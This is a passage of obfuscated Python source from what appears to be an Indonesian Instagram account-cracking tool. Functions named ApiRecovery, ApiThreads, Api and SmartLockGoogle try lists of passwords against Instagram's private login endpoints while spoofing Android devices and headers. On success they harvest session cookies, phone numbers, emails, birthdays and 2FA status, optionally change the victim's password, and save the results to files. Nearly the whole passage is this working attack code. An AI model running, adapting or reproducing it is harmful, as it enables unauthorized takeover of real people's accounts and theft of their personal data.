                "248955251",
                "248955247",
                "249178904",
                "248955244",
                "249507608",
                "249507582",
                "249507588",
                "249507585",
                "248955240",
                "249507607",
                "249507592",
                "249810008",
                "249966137",
                "249507610",
                "249966081",
                "249966100",
                "249507599",
                "249966140",
                "249810004",
                "123790722",
                "250188776",
                "249628096",
                "250188788",
                "250742103",
                "250742113",
                "250742102",
                "250877984",
                "250742105",
                "250742111",
                "251048681",
                "250742107",
                "250742115",
                "251048695",
                "251304696",
                "251304682",
                "251524431",
                "251530710",
                "251304689",
                "251524420",
                "251524409",
                "251524390",
                "250742101",
                "251048673",
                "252055918",
                "252055945",
                "251920416",
                "252055944",
                "252055925",
                "252239038",
                "252055936",
                "252055915",
                "252055948",
                "252390568",
                "252390583",
                "252580134",
                "252740497",
                "252740485",
                "252740490",
                "253120615",
                "253325372",
                "253325384",
                "253325385",
                "253447816",
                "253146263",
                "253120607",
                "253325374",
                "253120598",
                "253325371",
                "253447808",
                "253447809",
                "253325378",
                "253447814",
                "253447807",
                "253447811",
                "253447817",
                "253447813",
                "181496411",
                "253447806",
                "255191971",
                "255013798",
                "255777478",
                "255777471",
                "255777474",
                "255777472",
                "255959637",
                "255777477",
                "255959614",
                "255959635",
                "256099199",
                "256099204",
                "150338064",
                "256099153",
                "256099205",
                "256099156",
                "255983744",
                "256107300",
                "255777470",
                "126223536",
                "256203326",
                "256099190",
                "256099151",
                "256324061",
                "256324047",
                "256203339",
                "256966628",
                "256966589",
                "256966626",
                "256966590",
                "124584015",
                "257456576",
                "256966593",
                "257456590",
                "256966629",
                "256966587",
                "256966592",
                "257456586",
                "257456539",
                "259829115",
                "259829104",
                "259829113",
                "260037038",
                "259829105",
                "259829109",
                "260037030",
                "260149625",
                "259829103",
                "260149621",
                "260465044",
                "259829116",
                "260724710",
                "179155058",
                "261079769",
                "261079761",
                "261079768",
                "261079762",
                "261079771",
                "261276939",
                "157405370",
                "135374885",
                "261079765",
                "261393056",
                "261393062",
                "261079760",
                "181496406",
                "182747360",
                "261504698",
                "261690888",
                "261504706",
                "169474957",
                "262218766",
                "262290715",
                "262290774",
                "262372432",
                "262372425",
                "262372431",
                "262886993",
                "262886995",
                "262372426",
                "262886987",
                "261079764",
                "262886986",
                "262886988",
                "262886990",
                "262372433",
                "262886996",
                "263652962",
                "264009049",
                "264009019",
                "264009030",
                "264009021",
                "264009023",
                "264009052",
                "264009024",
                "261763534",
                "174081651",
                "169474965",
                "232867942",
                "264009013",
                "255959606",
                "264009028",
                "267397344",
                "267397322",
                "267925737",
                "267397343",
                "267925708",
                "267397327",
                "267397321",
                "267925714",
                "267258517",
                "267925705",
                "268773287",
                "267925733",
                "268773233",
                "267925702",
                "268773286",
                "159526770",
                "268773239",
                "268773272",
                "269790795",
                "269285030",
                "269790805",
                "269790803",
                "269790792",
                "268773227",
                "269849047",
                "270426177",
                "270426174",
                "271182277",
                "269790789",
                "271182270",
                "268773290",
                "271182266",
                "271182276",
                "269790798",
                "271182279",
                "271182265",
                "271182267",
                "269790807",
                "271823819",
                "272382110",
                "272382111",
                "272382106",
                "272693584",
                "272382095",
                "272382093",
                "272382098",
                "272382100",
                "272382103",
                "273728833",
                "273371577",
                "273728832",
                "273728798",
                "273907093",
                "273907111",
                "273907108",
                "238093987",
                "273907112",
                "273907103",
                "274774869",
                "274774891",
                "274774908",
                "273907087",
                "274774904",
                "274774875",
                "274774914",
                "275292626",
                "276027938",
                "276028040",
                "276027963",
                "276028037",
                "276028020",
                "276028017",
                "274774862",
                "276028013",
                "249507580",
                "276028029",
                "273907098",
                "277249238",
                "277249248",
                "277249249",
                "276028033",
                "277249250",
                "277249226",
                "275292623",
                "277249214",
                "277249242",
                "277249237",
                "277249240",
                "278625447",
                "278002558",
                "278625420",
                "278625431",
                "278625423",
                "117539687",
                "278625416",
                "278625444",
                "277249213",
                "278625451",
                "279469964",
                "279996068",
                "279996060",
                "279996067",
                "279996058",
                "280194220",
                "279996065",
                "279996063",
                "279996061",
                "279996059",
                "280894196",
                "273728787",
                "271182262",
                "281579032",
                "281579023",
                "276514494",
                "281579021",
                "281579027",
                "281579033",
                "268773274",
                "283072590",
                "281579025",
                "283072571",
                "282619332",
                "283489774",
                "283072587",
                "283072567",
                "281579031",
                "283072580",
                "283072574",
                "284459213",
                "284459224",
                "179155089",
                "256966583",
                "284459214",
                "283072585",
                "284459218",
                "284459223",
                "284459225",
                "285338607",
                "275113919",
                "284459221",
                "284459212",
                "284459215",
                "285855793",
                "285855800",
                "285855803",
                "285855791",
                "285855802",
                "285855804",
                "285855795",
                "286809973",
                "287420974",
                "287421023",
                "287420968",
                "287420979",
                "287421017",
                "287421005",
                "287421019",
                "287421012",
                "277249241",
                "288682406",
                "287421026",
                "288682405",
                "288682397",
                "288682407",
                "261079772",
                "288682398",
                "288682401",
                "288205409",
                "289692198",
                "287420997",
                "289692186",
            ]
        )
        A.Andr = random.choice(["28/9", "29/10", "30/11", "31/12"])
        A.apkv = f"{random.randint(100,312)}.{random.randint(1,10)}.0.{random.randint(20,35)}.{random.randint(90,120)}"
        A.ua1 = f"Instagram {A.apkv} Android ({A.Andr}; {A.Dpi}; {A.Ppxl}; OPPO; PEPM00; OP4ECB; qcom; in_ID; {A.kode})"
        A.ua2 = f"Instagram {A.apkv} Android ({A.Andr}; {A.Dpi}; {A.Ppxl}; realme; RMX3782; RE5C6CL1; mt6835; in_ID; {A.kode})"
        A.ua3 = f"Instagram {A.apkv} Android ({A.Andr}; {A.Dpi}; {A.Ppxl}; samsung; GT-I9060I; grandneove3g; sc8830; in_ID)"
        A.ua4 = f"Instagram {A.apkv} Android ({A.Andr}; {A.Dpi}; {A.Ppxl}; HTC/htc; HTC Desire 616 dual sim; htc_v3_dug; mt6592; in_iD)"
        return random.choice([A.ua1, A.ua2, A.ua3, A.ua4])

    def timezone_offset(A):
        A.tim = datetime.datetime.now(pytz.timezone("Asia/Jakarta"))
        A.ofs = A.tim.utcoffset().total_seconds() / 60 / 60
        return A.ofs

    def SetMid(A):
        return "" if len(A.MID) == 0 else random.choice(A.MID)

    def Blok_ID(A):
        A.v23 = "edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965"
        A.v39 = "c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49"
        A.v09 = "9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a"
        return random.choice([A.v09, A.v39, A.v23])

    def UseNet(A):
        return "MOBILE.LTE", "MOBILE(LTE)"

    def HeadersApiLogin(A):
        return {
            "host": "b.i.instagram.com",
            _AS: _q,
            _AT: _q,
            _AU: "id_ID",
            _AJ: f"UFS-{str(uuid.uuid4())}-3",
            _d: _i.format(time.time()),
            _e: "-1.000",
            _f: _T,
            _g: _T,
            _K: A.Blok_ID(),
            "x-ig-www-claim": _T,
            "x-bloks-is-prism-enabled": _AI,
            _AV: _AI,
            _U: "b7b95886-a663-41e4-8025-941a72c9ac4d",
            _N: "2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357",
            _E: "android-f4d8eb2bd1b86a47",
            _h: str(A.timezone_offset()),
            "x-fb-connection-type": A.UseNet()[0],
            "x-ig-connection-type": A.UseNet()[1],
            _AW: "3brTv10=",
            _I: _r,
            "priority": "u=3",
            _C: "Instagram 309.1.0.41.113 Android (31/12; 320dpi; 720x1460; INFINIX/Infinix; Infinix X6515; Infinix-X6515; mt6761; in_ID; 541635863)",
            _AH: _Aa,
            _u: str(A.SetMid()),
            "ig-intended-user-id": _T,
            _Y: "application/x-www-form-urlencoded; charset=UTF-8",
            _X: "2702",
            _AX: "Liger",
            _AY: _s,
            _AZ: _s,
        }

    def ChekDuplikat(A, users):
        B = users
        if str(B) not in A.bugbaru:
            A.bugbaru.append(B)
            return _A
        else:
            return _H

    def ApiRecovery(A, users, password):
        B = users
        with requests.Session() as Z:
            try:
                for C in password:
                    A.session = requests.Session()
                    A.session.headers.update(
                        {
                            **A.HeadersApiLogin(),
                            _d: _i.format(time.time()),
                            _e: _v.format(random.randint(100, 300)),
                            _f: str(random.randint(500000, 900000)),
                            _g: str(random.randint(1000, 9000)),
                            _C: A.AppUac(A.HeadersApiLogin()[_K]),
                            _E: "android-" + str(A.Android_ID(B, C).hexdigest()[:16]),
                            _N: str(uuid.uuid4()),
                            _U: str(uuid.uuid4()),
                        }
                    )
                    A.DataRec = {
                        _w: '{"client_input_params":{"contact_point":"'
                        + B
                        + '","password":"#PWD_INSTAGRAM:0:'
                        + str(int(time.time()))
                        + _O
                        + str(C)
                        + '","event_flow":"account_recovery","family_device_id":"'
                        + A.session.headers[_N]
                        + _Ac
                        + str(A.session.headers[_u])
                        + '","accounts_list":[],"has_whatsapp_installed":0,"login_attempt_count":1,"device_id":"'
                        + str(A.session.headers[_E])
                        + '","headers_infra_flow_id":"","auth_secure_device_id":"","encrypted_msisdn":"","device_emails":[],"lois_settings":{"lara_override":"","lois_token":""},"event_step":"AYMH_PASSWORD_FORM","secure_family_device_id":""},"server_params":{"is_caa_perf_enabled":0,"is_platform_login":0,"is_from_logged_out":0,"login_credential_type":"none","should_trigger_override_login_2fa_action":0,"is_from_logged_in_switcher":0,"family_device_id":"'
                        + str(A.session.headers[_N])
                        + '","credential_type":"password","waterfall_id":"'
                        + str(uuid.uuid4())
                        + '","password_text_input_id":"4kv99g:38","layered_homepage_experiment_group":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","INTERNAL__latency_qpl_instance_id":27691536400061,"device_id":"'
                        + str(A.session.headers[_E])
                        + '","server_login_source":"device_based_login","login_source":"AccountRecovery","caller":"gslr","should_trigger_override_login_success_action":0,"ar_event_source":"first_password_failure","INTERNAL__latency_qpl_marker_id":36707139}}',
                        _x: _Ad + str(A.session.headers[_K]) + _Ae,
                        _y: str(A.session.headers[_K]),
                    }
                    A.Query = _Af % (
                        urllib.parse.quote(A.DataRec[_w]),
                        urllib.parse.quote(A.DataRec[_x]),
                        A.DataRec[_y],
                    )
                    A.Respons = A.session.post(_AK, data=A.Query, allow_redirects=_A)
                    A._status = str(A.Respons.status_code)
                    if _z in A.Respons.text.replace(_F, ""):
                        A.Pepek = A.ChekDuplikat(B)
                        if A.Pepek is _H:
                            break
                        I = {}
                        try:
                            U = re.search(_A0, str(A.Respons.text.replace(_F, ""))).group(1)
                            N = base64.b64decode(U.split(_O)[2]).decode()
                            J = re.search(_A1, str(N)).group(1)
                            V = re.search(_A2, str(N)).group(1)
                            I.update({_A3: f"{J}", _A4: f"{V}"})
                            I.update(A.session.cookies.get_dict())
                            if str(J) in A.CrackDuplikat:
                                break
                            else:
                                A.CrackDuplikat.append(J)
                        except:
                            pass
                        D = A.Convert(I)
                        O = A.friends_user(D)
                        if O is not _B:
                            K, W, E, L, M, F, G = O
                        else:
                            F, G, a = A.friends_user_chek(B)
                            K = ""
                            W = ""
                            E = B
                            L = ""
                            M = ""
                        X = A.Fafo(D)
                        Q = X
                        if _A in A.UbahData:
                            A.a2f = A.TahapPertama2f(D)
                            A.cex = _A5 if A.a2f[_P] is _A else _A6
                            A.aut = A.a2f[_V]
                            A.pem = A.a2f[_G]
                            A.PWX = A.SandiBaru(D, C)
                            print(
                                f"""\r                                           
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{E}
 {P}password     : {H}{A.PWX}
 {P}nomor hp     : {H}{L}
 {P}email        : {H}{K}
 {P}birthday     : {H}{M}
 {P}status a2f   : {H}{A.cex}
 {P}authentikasi : {H}{A.aut}
 {P}pemulihan    : {H}{A.pem}
 {P}profile data : {H}{F}/{G}
 {P}Facebook acc : {Q}
 {P}cookie       : {H}{D}                                               """
                            )
                        else:
                            print(
                                f"""\r                                                
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Recovery
 {P}username     : {H}{E}
 {P}password     : {H}{C}
 {P}nomor hp     : {H}{L}
 {P}email        : {H}{K}
 {P}birthday     : {H}{M}
 {P}Facebook acc : {Q}
 {P}profile data : {H}{F}/{G}
 {P}cookie       : {H}{D}                                               """
                            )
                            A.aut = _B
                            A.pem = _B
                            A.PWX = C
                        open(_A7 % file_ok, _R, encoding=_D).write(
                            f"{E}|{A.PWX}|{F}|{G}|{A.aut}|{A.pem}|{D}\n"
                        )
                        A.ResultSuccess += 1
                        break
                    elif _Ag in A.Respons.text.replace(_F, ""):
                        R, S, T = A.friends_user_chek(B)
                        print(
                            f"""\r                                
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Recovery
 {P}username     : {K2}{B}
 {P}password     : {K2}{C}
 {P}data profile : {K2}{R}/{S}/{T}                                  """
                        )
                        open(_A8 % file_ok, _R, encoding=_D).write(f"{B}|{C}|{R}/{S}/{T}\n")
                        A.ResultChechpoint += 1
                        break
                A.Loop += 1
                Y = "200"
                Console(style=temane[0]).print(
                    f"© Run: {Y} Live: {A.ResultSuccess} Check: {A.ResultChechpoint} Runn: {A.Loop} ]",
                    end="\r",
                )
            except (AttributeError, requests.exceptions.ConnectionError):
                time.sleep(10)

    def ApiThreads(A, users, password):
        B = users
        global file_ok
        try:
            for D in password:
                C = requests.Session()
                C.headers.update(
                    {
                        **A.HeadersApiLogin(),
                        _d: _i.format(time.time()),
                        _e: _v.format(random.randint(100, 300)),
                        _f: str(random.randint(500000, 900000)),
                        _g: str(random.randint(1000, 9000)),
                        _U: str(uuid.uuid4()),
                        _N: str(uuid.uuid4()),
                        _E: _A9 % A.Android_ID(B, D).hexdigest()[:16],
                        _h: str(A.timezone_offset()),
                        _I: "3419628305025917",
                        _C: A.AppUac(A.HeadersApiLogin()[_K]),
                    }
                )
                W = "#PWD_INSTAGRAM:0:%s:%s" % (int(time.time()), D)
                O = f"params=%7B%22client_input_params%22%3A%7B%22password%22%3A%22{urllib.parse.quote_plus(W)}%22%2C%22contact_point%22%3A%22{str(B)}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22event_flow%22%3A%22login_manual%22%2C%22openid_tokens%22%3A%7B%7D%2C%22machine_id%22%3A%22%22%2C%22family_device_id%22%3A%22{C.headers[_N]}%22%2C%22accounts_list%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22has_whatsapp_installed%22%3A0%2C%22login_attempt_count%22%3A1%2C%22device_id%22%3A%22{C.headers[_E]}%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22auth_secure_device_id%22%3A%22%22%2C%22encrypted_msisdn%22%3A%22%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22device_emails%22%3A%5B%5D%2C%22lois_settings%22%3A%7B%22lara_override%22%3A%22%22%2C%22lois_token%22%3A%22%22%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22event_step%22%3A%22home_page%22%2C%22secure_family_device_id%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22is_caa_perf_enabled%22%3A0%2C%22is_platform_login%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_in_switcher%22%3A0%2C%22family_device_id%22%3A%22{C.headers[_N]}%22%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22credential_type%22%3A%22password%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22username_text_input_id%22%3A%22u7x8ax%3A58%22%2C%22password_text_input_id%22%3A%22u7x8ax%3A59%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A182729300100110%2C%22device_id%22%3A%22{C.headers[_E]}%22%2C%22server_login_source%22%3A%22login%22%2C%22login_source%22%3A%22Login%22%2C%22caller%22%3A%22gslr%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73"
                C.headers.update({_X: str(len(O))})
                J = C.post(_AK, data=O, allow_redirects=_A)
                if _z in str(J.text.replace(_F, "")):
                    A.Pepek = A.ChekDuplikat(B)
                    if A.Pepek is _H:
                        break
                    K = {}
                    try:
                        X = re.search(_A0, str(J.text.replace(_F, ""))).group(1)
                        Q = base64.b64decode(X.split(_O)[2]).decode()
                        Y = re.search(_A1, str(Q)).group(1)
                        Z = re.search(_A2, str(Q)).group(1)
                        K.update({_A3: f"{Y}", _A4: f"{Z}"})
                        K.update(C.cookies.get_dict())
                    except:
                        pass
                    E = A.Convert(K)
                    R = A.friends_user(E)
                    if R is not _B:
                        L, a, F, M, N, G, I = R
                    else:
                        G, I, d = A.friends_user_chek(B)
                        L = ""
                        a = ""
                        F = B
                        M = ""
                        N = ""
                    b = A.Fafo(E)
                    S = b
                    if _A in A.UbahData:
                        A.a2f = A.TahapPertama2f(E)
                        A.cex = _A5 if A.a2f[_P] is _A else _A6
                        A.aut = A.a2f[_V]
                        A.pem = A.a2f[_G]
                        A.PWX = A.SandiBaru(E, D)
                        print(
                            f"""\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}Threads
 {P}username     : {H}{F}
 {P}password     : {H}{A.PWX}
 {P}nomor hp     : {H}{M}
 {P}email        : {H}{L}
 {P}birthday     : {H}{N}
 {P}status a2f   : {H}{A.cex}
 {P}authentikasi : {H}{A.aut}
 {P}pemulihan    : {H}{A.pem}
 {P}profile data : {H}{G}/{I}
 {P}Facebook acc : {S}
 {P}cookie       : {H}{E}                                                   """
                        )
                    else:
                        print(
                            f"""\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}Threads
 {P}username     : {H}{F}
 {P}password     : {H}{D}
 {P}nomor hp     : {H}{M}
 {P}email        : {H}{L}
 {P}birthday     : {H}{N}
 {P}Facebook acc : {S}
 {P}profile data : {H}{G}/{I}
 {P}cookie       : {H}{E}                                                   """
                        )
                        A.aut = _B
                        A.pem = _B
                        A.PWX = D
                    open(_A7 % file_ok, _R, encoding=_D).write(
                        f"{F}|{A.PWX}|{G}|{I}|{A.aut}|{A.pem}|{E}\n"
                    )
                    A.ResultSuccess += 1
                    break
                elif _Ah in str(J.text.replace(_F, "")):
                    T, U, V = A.friends_user_chek(B)
                    print(
                        f"""\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Threads
 {P}username     : {K2}{B}
 {P}password     : {K2}{D}
 {P}data profile : {K2}{T}/{U}/{V}                                             """
                    )
                    open(_A8 % file_ok, _R, encoding=_D).write(f"{B}|{D}|{T}/{U}/{V}\n")
                    A.ResultChechpoint += 1
                    break
            A.Loop += 1
            c = "200"
            Console(style=temane[0]).print(
                f"© Run: {c} Live: {A.ResultSuccess} Check: {A.ResultChechpoint} Runn: {A.Loop} ]",
                end="\r",
            )
        except (AttributeError, requests.exceptions.ConnectionError):
            time.sleep(10)

    def Api(A, users, password):
        B = users
        global file_ok
        with requests.Session() as E:
            try:
                for C in password:
                    E.headers.update(
                        {
                            **A.HeadersApiLogin(),
                            _AJ: f"UFS-{str(uuid.uuid4())}-0",
                            _d: _i.format(time.time()),
                            _e: _v.format(random.randint(100, 999)),
                            _f: str(random.randint(2000, 5000)),
                            _g: str(random.randint(500, 4000)),
                            _U: str(uuid.uuid4()),
                            _E: _A9 % A.Android_ID(B, C).hexdigest()[:16],
                            _h: str(A.timezone_offset()),
                            _I: _r,
                            _C: A.AppUac(A.HeadersApiLogin()[_K]),
                        }
                    )
                    A.payloadIG = (
                        'params={"client_input_params":{"device_id":"'
                        + E.headers[_E]
                        + '","login_attempt_count":1,"secure_family_device_id":"","machine_id":"'
                        + str(E.headers[_u])
                        + '","accounts_list":[],"auth_secure_device_id":"","has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:'
                        + str(int(time.time()))
                        + _O
                        + C
                        + '","sso_token_map_json_string":"","family_device_id":"'
                        + str(uuid.uuid4())
                        + '","fb_ig_device_id":[],"device_emails":[],"try_num":1,"lois_settings":{"lois_token":"","lara_override":""},"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{},"client_known_key_hash":"","contact_point":"'
                        + B
                        + '","encrypted_msisdn":""},"server_params":{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"18g3p8:57","layered_homepage_experiment_group":null,"should_trigger_override_login_success_action":0,"device_id":null,"login_credential_type":"none","server_login_source":"login","waterfall_id":"'
                        + str(uuid.uuid4())
                        + '","login_source":"Login","INTERNAL__latency_qpl_instance_id":7465439600681,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"18g3p8:58","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}&bk_client_context={"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
                    )
                    E.headers.update({_X: str(len(A.payloadIG))})
                    A.responsIG = E.post(_AK, data=A.payloadIG, allow_redirects=_A)
                    if _z in A.responsIG.text.replace(_F, ""):
                        A.Pepek = A.ChekDuplikat(B)
                        if A.Pepek is _H:
                            break
                        J = {}
                        try:
                            V = re.search(_A0, str(A.responsIG.text.replace(_F, ""))).group(1)
                            O = base64.b64decode(V.split(_O)[2]).decode()
                            W = re.search(_A1, str(O)).group(1)
                            X = re.search(_A2, str(O)).group(1)
                            J.update({_A3: f"{W}", _A4: f"{X}"})
                            J.update(A.responsIG.cookies.get_dict())
                        except:
                            pass
                        D = A.Convert(J)
                        Q = A.friends_user(D)
                        if Q is not _B:
                            K, Y, F, L, M, G, I = Q
                        else:
                            G, I, a = A.friends_user_chek(B)
                            K = ""
                            Y = ""
                            F = B
                            L = ""
                            M = ""
                        Z = A.Fafo(D)
                        R = Z
                        if _A in A.UbahData:
                            A.a2f = A.TahapPertama2f(D)
                            A.cex = _A5 if A.a2f[_P] is _A else _A6
                            A.aut = A.a2f[_V]
                            A.pem = A.a2f[_G]
                            A.PWX = A.SandiBaru(D, C)
                            print(
                                f"""\r                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{F}
 {P}password     : {H}{A.PWX}
 {P}nomor hp     : {H}{L}
 {P}email        : {H}{K}
 {P}birthday     : {H}{M}
 {P}status a2f   : {H}{A.cex}
 {P}authentikasi : {H}{A.aut}
 {P}pemulihan    : {H}{A.pem}
 {P}profile data : {H}{G}/{I}
 {P}Facebook acc : {R}
 {P}cookie       : {H}{D}                                                  """
                            )
                        else:
                            print(
                                f"""\r                                                         
 {P}status       : {H}Success Login
 {P}methode      : {H}Instagram Manual
 {P}username     : {H}{F}
 {P}password     : {H}{C}
 {P}nomor hp     : {H}{L}
 {P}email        : {H}{K}
 {P}birthday     : {H}{M}
 {P}Facebook acc : {R}
 {P}profile data : {H}{G}/{I}
 {P}cookie       : {H}{D}                                               """
                            )
                            A.aut = _B
                            A.pem = _B
                            A.PWX = C
                        open(_A7 % file_ok, _R, encoding=_D).write(
                            f"{F}|{A.PWX}|{G}|{I}|{A.aut}|{A.pem}|{D}\n"
                        )
                        A.ResultSuccess += 1
                        break
                    elif _Ag in A.responsIG.text.replace(_F, ""):
                        S, T, U = A.friends_user_chek(B)
                        print(
                            f"""\r                                                         
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}Instagram Manual
 {P}username     : {K2}{B}
 {P}password     : {K2}{C}
 {P}data profile : {K2}{S}/{T}/{U}                                          """
                        )
                        open(_A8 % file_ok, _R, encoding=_D).write(f"{B}|{C}|{S}/{T}/{U}\n")
                        A.ResultChechpoint += 1
                        break
                A.Loop += 1
                try:
                    N = N
                except:
                    N = "200"
                Console(style=temane[0]).print(
                    f"© Run: {N} Live: {A.ResultSuccess} Check: {A.ResultChechpoint} Runn: {A.Loop} ]",
                    end="\r",
                )
            except (AttributeError, requests.exceptions.ConnectionError):
                time.sleep(10)

    def SmartLockGoogle(A, users, password):
        B = users
        global file_ok
        try:
            for D in password:
                C = requests.Session()
                C.headers.update(
                    {
                        **A.HeadersApiLogin(),
                        _AJ: f"UFS-{str(uuid.uuid4())}-0",
                        _d: _i.format(time.time()),
                        _e: _v.format(random.randint(100, 999)),
                        _f: str(random.randint(500000, 900000)),
                        _g: str(random.randint(1000, 9000)),
                        _U: str(uuid.uuid4()),
                        _N: str(uuid.uuid4()),
                        _E: _A9 % A.Android_ID(B, D).hexdigest()[:16],
                        _h: str(A.timezone_offset()),
                        _I: _r,
                        _C: A.AppUac(A.HeadersApiLogin()[_K]),
                    }
                )
                A.SmartData = {
                    _w: '{"client_input_params":{"device_id":"'
                    + str(C.headers[_E])
                    + '","lois_settings":{"lois_token":"","lara_override":""},"name":"'
                    + str(B)
                    + _Ac
                    + str(C.headers[_u])
                    + '","profile_pic_url":null,"contact_point":"'
                    + str(B)
                    + '","encrypted_password":"#PWD_INSTAGRAM:0:'
                    + str(int(time.time()))
                    + _O
                    + str(D)
                    + '"},"server_params":{"is_from_logged_out":0,"layered_homepage_experiment_group":null,"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"'
                    + str(C.headers[_N])
                    + '","device_id":"'
                    + str(C.headers[_U])
                    + '","offline_experiment_group":null,"INTERNAL_INFRA_THEME":"harm_f","waterfall_id":"'
                    + str(uuid.uuid4())
                    + '","login_source":"Login","INTERNAL__latency_qpl_instance_id":73767726200338,"is_from_logged_in_switcher":0,"is_platform_login":0}}',
                    _x: _Ad + str(C.headers[_K]) + _Ae,
                    _y: str(C.headers[_K]),
                }
                A.Query = _Af % (
                    urllib.parse.quote(A.SmartData[_w]),
                    urllib.parse.quote(A.SmartData[_x]),
                    A.SmartData[_y],
                )
                C.headers.update({_X: str(len(A.Query))})
                F = C.post(
                    "https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request/",
                    data=A.SmartData,
                    allow_redirects=_A,
                )
                if _z in str(F.text.replace(_F, "")):
                    A.Pepek = A.ChekDuplikat(B)
                    if A.Pepek is _H:
                        break
                    K = {}
                    try:
                        V = re.search(_A0, str(F.text.replace(_F, ""))).group(1)
                        O = base64.b64decode(V.split(_O)[2]).decode()
                        W = re.search(_A1, str(O)).group(1)
                        X = re.search(_A2, str(O)).group(1)
                        K.update({_A3: f"{W}", _A4: f"{X}"})
                        K.update(F.cookies.get_dict())
                    except:
                        pass
                    E = A.Convert(K)
                    Q = A.friends_user(E)
                    if Q is not _B:
                        L, Y, G, M, N, I, J = Q
                    else:
                        I, J, b = A.friends_user_chek(B)
                        L = ""
                        Y = ""
                        G = B
                        M = ""
                        N = ""
                    Z = A.Fafo(E)
                    R = Z
                    if _A in A.UbahData:
                        A.a2f = A.TahapPertama2f(E)
                        A.cex = _A5 if A.a2f[_P] is _A else _A6
                        A.aut = A.a2f[_V]
                        A.pem = A.a2f[_G]
                        A.PWX = A.SandiBaru(E, D)
                        print(
                            f"""\r                                                                     
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{G}
 {P}password     : {H}{A.PWX}
 {P}nomor hp     : {H}{M}
 {P}email        : {H}{L}
 {P}birthday     : {H}{N}
 {P}status a2f   : {H}{A.cex}
 {P}authentikasi : {H}{A.aut}
 {P}pemulihan    : {H}{A.pem}
 {P}profile data : {H}{I}/{J}
 {P}Facebook acc : {R}
 {P}cookie       : {H}{E}                                                             """
                        )
                    else:
                        print(
                            f"""\r                                               
 {P}status       : {H}Success Login
 {P}methode      : {H}SmartLock
 {P}username     : {H}{G}
 {P}password     : {H}{D}
 {P}nomor hp     : {H}{M}
 {P}email        : {H}{L}
 {P}birthday     : {H}{N}
 {P}Facebook acc : {R}
 {P}profile data : {H}{I}/{J}
 {P}cookie       : {H}{E}                                                  """
                        )
                        A.aut = _B
                        A.pem = _B
                        A.PWX = D
                    open(_A7 % file_ok, _R, encoding=_D).write(
                        f"{G}|{A.PWX}|{I}|{J}|{A.aut}|{A.pem}|{E}\n"
                    )
                    A.ResultSuccess += 1
                    break
                elif _Ah in str(F.text.replace(_F, "")):
                    S, T, U = A.friends_user_chek(B)
                    print(
                        f"""\r                                                        
 {P}status       : {K2}Checkpoint
 {P}methode      : {K2}SmartLock
 {P}username     : {K2}{B}
 {P}password     : {K2}{D}
 {P}data profile : {K2}{S}/{T}/{U}                             """
                    )
                    open(_A8 % file_ok, _R, encoding=_D).write(f"{B}|{D}|{S}/{T}/{U}\n")
                    A.ResultChechpoint += 1
                    break
            A.Loop += 1
            a = "200"
            Console(style=temane[0]).print(
                f"© Run: {a} Live: {A.ResultSuccess} Check: {A.ResultChechpoint} Runn: {A.Loop} ]",
                end="\r",
            )
        except (AttributeError, requests.exceptions.ConnectionError):
            time.sleep(10)

    def data_graph(C, xxx):
        A = xxx
        B = {
            "av": re.search(_Ak, str(A)).group(1),
            "__d": "www",
            "__user": _T,
            "__a": _L,
            _AL: "h",
            "__hs": re.search(_Al, str(A)).group(1),
            "dpr": _M,
            "__ccg": "GOOD",
            "__rev": re.search('{"consistency":{"rev":(\\d+)}', str(A)).group(1),
            "__s": "",
            "__hsi": re.search(_Am, str(A)).group(1),
            "__dyn": "",
            "__csr": "",
